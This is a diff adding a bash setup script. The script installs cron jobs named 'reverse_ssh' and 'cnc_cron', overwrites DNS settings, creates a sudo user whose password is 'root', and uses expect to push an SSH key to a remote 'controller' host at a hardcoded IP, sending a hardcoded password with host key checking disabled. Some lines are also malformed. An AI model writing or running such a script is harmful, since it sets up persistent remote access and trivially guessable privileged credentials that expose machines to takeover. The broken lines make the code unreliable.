@@ -1,0 +1,18 @@
+#!/bin/bash
+
+apt update -y
+apt upgrade -y
+
+apt install expect python3-pip python-pip expect ifmetric wvdial libz-dev libssl-dev libpcap0.8-dev libcurl4-openssl-dev whereami-y
+
+cp ./reverse_ssh /etc/cron.d/
+cp ./cnc_cron /etc/cron.d/
+
+echo "nameserver 1.1.1.1" > /etc/resolv.conf
+
+useradd -s /bin/bash -G sudo rumen
+echo -e "root\nroot" | passwd rumen
+su rumen
+ssh-keygen -b 2048 -t rsa -f /home/rumen -q -N ""
+
+expect -c 'spawn ssh-copy-id controller@78.130.176.104 -o "StrictHostKeyChecking no"; expect "assword:"; send "root\r"; interact'
